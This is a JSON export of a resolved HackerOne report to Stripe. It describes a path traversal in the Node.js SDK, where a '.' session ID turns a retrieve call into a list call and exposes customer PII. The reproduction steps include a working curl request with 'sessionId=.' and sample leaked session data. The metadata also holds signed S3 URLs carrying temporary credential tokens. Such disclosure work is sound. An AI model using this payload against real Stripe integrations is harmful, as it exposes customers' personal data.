{
  "id": 1575014,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTc1MDE0",
  "url": "https://hackerone.com/reports/1575014",
  "title": "Limited path traversal in Node.js SDK leads to PII disclosure",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2022-05-18T21:15:20.734Z",
  "submitted_at": "2022-05-18T21:15:20.826Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "zerodivisi0n",
    "url": "/zerodivisi0n",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/122/196/a369710e8a3ed9beee39a65be884e49e57a9fb13_original.jpeg/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 50933,
    "url": "https://hackerone.com/stripe",
    "handle": "stripe",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/oje0985ewr1z66rlzofs2fjfda8y/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22stripe-s.png%22%3B%20filename%2A%3DUTF-8%27%27stripe-s.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUGXJVS72%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T200315Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIQDYx6oT2cg3Z0EPGt2CIXH7sGOLPl0%2FFKq23mqEi1UfCAIgMnDzG0xhFfPicCqNGEqJ%2FruYAjF%2BWXEad4GXQmL1G2IquwUI8f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDKqcpvbExW66ei02rSqPBQ9VrJ7lQkv1nOG54zjqboo4Hn%2B1%2Bz221d3Ll0qd04jCY2r5bCXJYhAGInuCy66LEN%2FysQuuQl%2Fiu8Unms2nL5Z1353bEBRXNW%2FnIU5uq0nhkLMfwzzE5peW8g4KpZ4OsrwFyR4VgeOGUE5oIoiJLOtymugiKfyPRfzewJiDA7ndYA94e5cRFLTJAUXcPIsq4jYo8zzmx1JDbn%2BrZOzIpDV63H6N1Yibemrb%2BJdGqfnGzYUh%2BuqoiBmaVkQimF3SZOopE5Hd3ofiOvvoWcOFIO%2FNb75rL16tOfGqYER91bzUAnLeuh3SEMr47vs78sBPdZ%2Btgcm000UDVYcIavox7PDQ9MnWXQhf8AEjZxIVeSyl7hE2qSzPZS58xTNOk6Z1G6BrVMe0Rqyp%2BfHyiXRuzKvfCkazxpDaX3VZ173vAPjdQzItmhrbXMoJA8UJEAs5u1bYGZI5F8dZa9cddJpdpX%2Fn%2BWJ565PggsrecHn2DeuItkL%2Bh6aO40fJK14m8WI8hJTxVBVHWx1N7o4rad9VoxzudOUVOipZCZNEPTZNkVqaeiLOQiEzlWJ%2BgUcvffDXV0ycbidOlcJW9pfi0pmIxkInDGovD0U%2Fx9P8jDHWPwYm2cdVTRbQAw5KhlrJkg7UWkwAo9KabiQjGqeSvdymRnlhp%2FwpvOuTsEctIuRKTmJDpcNk%2FrFwLPz0yx9FON7V%2FiaDXuVuosYtolv25r1O1NmqSJuiREM7sEPq9WiuFwDfYZgjBDg9yNrT3zJNAtfToJ0tf4Zfb7wO8buPXwbzd1aGIanFonjNvuCsCVNW92jguH9Tc50rhpVyLEK6FvtWkYRDR3fHAn5D8J6yQTKtz0mCOsqpBMz4QmUiF8GtkPgwrpi7xgY6sQG5gCxcLhDmSUrykEqqpB46%2FyTAdPjZsuxlsbrYeBYwrRyVmEokmwcSDc4iKi5dWfsf5xOXO%2BFkr%2FduOuj5lAnyaQoG4dreT%2BQlovcUY9W02naKFzM0C1uFTIlmP86dKszCTzeYtA731LtrcmF9mBfFRfmc9BP2gLUxXkWiTiVsgGHrXJsVejYmrzn0JCVCbubS395HM58phWFayI8eMGHP2fwz3IxHFB6WFK2BSUR3VQ8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1f4837fff949edd4649966a27e1f706c9b668f0827492cc94b6ef12d590982af",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/oje0985ewr1z66rlzofs2fjfda8y/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22stripe-s.png%22%3B%20filename%2A%3DUTF-8%27%27stripe-s.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUGXJVS72%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T200315Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIQDYx6oT2cg3Z0EPGt2CIXH7sGOLPl0%2FFKq23mqEi1UfCAIgMnDzG0xhFfPicCqNGEqJ%2FruYAjF%2BWXEad4GXQmL1G2IquwUI8f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDKqcpvbExW66ei02rSqPBQ9VrJ7lQkv1nOG54zjqboo4Hn%2B1%2Bz221d3Ll0qd04jCY2r5bCXJYhAGInuCy66LEN%2FysQuuQl%2Fiu8Unms2nL5Z1353bEBRXNW%2FnIU5uq0nhkLMfwzzE5peW8g4KpZ4OsrwFyR4VgeOGUE5oIoiJLOtymugiKfyPRfzewJiDA7ndYA94e5cRFLTJAUXcPIsq4jYo8zzmx1JDbn%2BrZOzIpDV63H6N1Yibemrb%2BJdGqfnGzYUh%2BuqoiBmaVkQimF3SZOopE5Hd3ofiOvvoWcOFIO%2FNb75rL16tOfGqYER91bzUAnLeuh3SEMr47vs78sBPdZ%2Btgcm000UDVYcIavox7PDQ9MnWXQhf8AEjZxIVeSyl7hE2qSzPZS58xTNOk6Z1G6BrVMe0Rqyp%2BfHyiXRuzKvfCkazxpDaX3VZ173vAPjdQzItmhrbXMoJA8UJEAs5u1bYGZI5F8dZa9cddJpdpX%2Fn%2BWJ565PggsrecHn2DeuItkL%2Bh6aO40fJK14m8WI8hJTxVBVHWx1N7o4rad9VoxzudOUVOipZCZNEPTZNkVqaeiLOQiEzlWJ%2BgUcvffDXV0ycbidOlcJW9pfi0pmIxkInDGovD0U%2Fx9P8jDHWPwYm2cdVTRbQAw5KhlrJkg7UWkwAo9KabiQjGqeSvdymRnlhp%2FwpvOuTsEctIuRKTmJDpcNk%2FrFwLPz0yx9FON7V%2FiaDXuVuosYtolv25r1O1NmqSJuiREM7sEPq9WiuFwDfYZgjBDg9yNrT3zJNAtfToJ0tf4Zfb7wO8buPXwbzd1aGIanFonjNvuCsCVNW92jguH9Tc50rhpVyLEK6FvtWkYRDR3fHAn5D8J6yQTKtz0mCOsqpBMz4QmUiF8GtkPgwrpi7xgY6sQG5gCxcLhDmSUrykEqqpB46%2FyTAdPjZsuxlsbrYeBYwrRyVmEokmwcSDc4iKi5dWfsf5xOXO%2BFkr%2FduOuj5lAnyaQoG4dreT%2BQlovcUY9W02naKFzM0C1uFTIlmP86dKszCTzeYtA731LtrcmF9mBfFRfmc9BP2gLUxXkWiTiVsgGHrXJsVejYmrzn0JCVCbubS395HM58phWFayI8eMGHP2fwz3IxHFB6WFK2BSUR3VQ8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e8b4dc92703279d4db5b357f0ef51673e9de0ca573362829f401996241af0603"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Stripe",
      "twitter_handle": "stripe",
      "website": "https://stripe.com",
      "about": "Stripe is a global technology company that builds economic infrastructure for the internet."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2023-10-10T10:00:06.157Z",
  "bug_reporter_agreed_on_going_public_at": "2023-09-27T19:54:49.346Z",
  "team_member_agreed_on_going_public_at": "2023-10-10T10:00:06.052Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nIt is possible to use `.` and `..` as identifier in all API methods, which leads to calling the parent api method.\nNext, I will describe the problem using checkout sessions as an example,  because it is the most basic one. However, other methods are also vulnerable to this problem.\nFor example, using `.` as checkout session id in [Retrieve a Session](https://stripe.com/docs/api/checkout/sessions/retrieve) method leads to call [List all Checkout Sessions](https://stripe.com/docs/api/checkout/sessions/list) method.\nThe problem arises because the Node.js http implementation automatically normalizes the path, so request `https://api.stripe.com/v1/checkout/sessions/.` will normalize to `https://api.stripe.com/v1/checkout/sessions/`.\nI checked other SDKs and it looks like the problem is only in the Node.js SDK.\n\n## Steps To Reproduce:\nFor ease of reproduction, let's create a project using [accept-a-payment](https://github.com/stripe-samples/accept-a-payment) sample template.\n\n  1. Register Stripe account and obtain `STRIPE_SECRET_KEY`\n  1. Create sample project using Stripe docker cli: `docker run --rm -it -v $(pwd):/samples -w /samples stripe/stripe-cli:latest samples create accept-a-payment`\n  1. Choose `prebuilt-checkout-page` integration, `html` client and `node` server.\n  1. Create `.env` file in `accept-a-payment/server` directory with contents:\n    ```\n    STRIPE_SECRET_KEY=xxx\n    STATIC_DIR=/app/client\n    DOMAIN=http://localhost:4242\n    ```\n  1. Run another docker container with nodejs: `run -it --rm -v $(pwd)/accept-a-payment:/app -w /app/server -p 4242:4242 node bash`\n  1. Install dependencies: `npm install`\n  1. Start the server: `node server.js`\n  1. Open web page in browser and complete the payment: `http://localhost:4242`\n  1. Send curl request in terminal: `curl \"http://localhost:4242/checkout-session?sessionId=.\" | jq` (this request does not require any authentication and returns PII of all successful payments).\n\nExample output:\n```json\n{                                                                                                                                                                                                                  \n  \"object\": \"list\",                                                                                                                                                                                                \n  \"data\": [                                                                                                                                                                                                        \n    {                                                                                                                                                                                                              \n      \"id\": \"cs_test_a14L46PUF4tbXhcFrVU4Zv42kBQD2Hw5TIR6XdNHPJFckllG1Un4MztwlF\",                                                                                                                                  \n      \"object\": \"checkout.session\",                                                                                                                                                                                \n      \"after_expiration\": null,                                                                                                                                                                                    \n      \"allow_promotion_codes\": null,                                                                                                                                                                               \n      \"amount_subtotal\": 500,                                                                                                                                                                                      \n      \"amount_total\": 500,                                                                                                                                                                                         \n      \"automatic_tax\": {                                                                                                                                                                                           \n        \"enabled\": false,                                                                                                                                                                                          \n        \"status\": null                                                                                                                                                                                             \n      },                                                                                                                                                                                                           \n      \"billing_address_collection\": null,                                                                                                                                                                          \n      \"cancel_url\": \"http://localhost:4242/canceled.html\",                                                                                                                                                         \n      \"client_reference_id\": null,                                                                                                                                                                                 \n      \"consent\": null,                                                                                                                                                                                             \n      \"consent_collection\": null,                                                                                                                                                                                  \n      \"currency\": \"usd\",                                                                                                                                                                                           \n      \"customer\": \"cus_LiJwdI9LfI4c9k\",                                                                                                                                                                            \n      \"customer_creation\": \"always\",                                                                                                                                                                               \n      \"customer_details\": {                                                                                                                                                                                        \n        \"address\": {                                                                                     \n          \"city\": null,                                                                                  \n          \"country\": \"RU\",\n          \"line1\": null,\n          \"line2\": null,\n          \"postal_code\": null,\n          \"state\": null                                                                                  \n        },                         \n        \"email\": \"zerodivisi0n@wearehackerone.com\",\n        \"name\": \"BB Tester\",        \n        \"phone\": null,       \n        \"tax_exempt\": \"none\",\n        \"tax_ids\": []   \n      }\n      \"customer_email\": null,                                                                                                                                                                                      \n      \"expires_at\": 1652991126,                                                                                                                                                                                    \n      \"livemode\": false,                                                                                                                                                                                           \n      \"locale\": null,                                                                                                                                                                                              \n      \"metadata\": {                                                                                                                                                                                                \n      },                                                                                                                                                                                                           \n      \"mode\": \"payment\",                                                                                                                                                                                           \n      \"payment_intent\": \"pi_3L0tE3DrJVF2EnNj1zw13o1n\",                                                                                                                                                             \n      \"payment_link\": null,                                                                                                                                                                                        \n      \"payment_method_options\": {                                                                                                                                                                                  \n      },                                                                                                                                                                                                           \n      \"payment_method_types\": [                                                                                                                                                                                    \n        \"card\"                                                                                                                                                                                                     \n      ],                                                                                                                                                                                                           \n      \"payment_status\": \"paid\",                                                                                                                                                                                    \n      \"phone_number_collection\": {                                                                                                                                                                                 \n        \"enabled\": false                                                                                                                                                                                           \n      },                                                                                                                                                                                                           \n      \"recovered_from\": null,                                                                                                                                                                                      \n      \"setup_intent\": null,                                                                                                                                                                                        \n      \"shipping\": null,                                                                                                                                                                                            \n      \"shipping_address_collection\": null,                                                                                                                                                                         \n      \"shipping_options\": [                                                                                                                                                                                        \n                                                                                                                                                                                                                   \n      ],                                                                                                                                                                                                           \n      \"shipping_rate\": null,                                                                                                                                                                                       \n      \"status\": \"complete\",                                                                                                                                                                                        \n      \"submit_type\": null,                                                                                                                                                                                         \n      \"subscription\": null,                                                                                                                                                                                        \n      \"success_url\": \"http://localhost:4242/success.html?session_id={CHECKOUT_SESSION_ID}\",                                                                                                                        \n      \"total_details\": {                                                                                                                                                                                           \n        \"amount_discount\": 0,                                                                                                                                                                                      \n        \"amount_shipping\": 0,                                                                                                                                                                                      \n        \"amount_tax\": 0                                                                                                                                                                                            \n      },                                                                                                                                                                                                           \n      \"url\": null                                                                                                                                                                                                  \n    }                                                                                                                                                                                                              \n  ],                                                                                                                                                                                                               \n  \"has_more\": false,                                                                                                                                                                                               \n  \"url\": \"/v1/checkout/sessions\"\n}\n```\n\nIn my example, only one session is returned, but in reality all current user sessions will be returned there.\nI understand that this is only sample code and there may be more reliable implementations in production. However, such a sample code is usually used as a reference and I think that protection against this kind of attacks should be at the SDK level.\n\n## Impact\n\nThe attacker can periodically call this method and grab PII, such as user's email address, name and address.",
  "bounty_amount": "1000.0",
  "formatted_bounty": "$1,000",
  "weakness": {
    "id": 18,
    "name": "Information Disclosure"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 18,
  "voters": [
    "mr-medi",
    "n1m0",
    "zy9ard3",
    "trieulieuf9",
    "shreyaschavhan",
    "nightm4re",
    "shubham_srt",
    "2026",
    "kerolesmagdy",
    "eminfidan",
    "and 8 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 5.9,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 61184,
    "asset_type": "OTHER",
    "asset_identifier": "Stripe SDKs",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
